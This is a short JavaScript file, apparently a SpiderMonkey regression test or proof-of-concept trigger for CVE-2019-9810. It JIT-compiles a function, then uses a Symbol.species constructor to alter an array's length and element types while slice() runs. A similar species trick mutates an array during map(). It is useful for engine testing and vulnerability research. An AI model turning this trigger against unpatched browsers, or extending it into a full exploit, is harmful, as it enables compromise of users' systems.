// sm: CVE-2019-9810 (IonMonkey assumed Array.prototype.slice has no side effects, Pwn2Own 2019) species
var victim = [1.1, 2.2, 3.3, 4.4];
var other = [0, 1, 2, 3, 4, 5, 6, 7];
function hot(arr, o) { var x = o[3]; arr.slice(); return o[3] + x; }
for (var i = 0; i < 300; i++) hot([1, 2], other);
var e = [1, 2];
e.constructor = function () {};
e.constructor[Symbol.species] = function (n) { other.length = 0; other[3] = {}; return new Array(n); };
print(typeof hot(e, other), other.length);
victim.constructor = { [Symbol.species]: function () { return victim; } };
print(String(victim.map(function (x, i) { victim.length = 1; return x * 2; })));
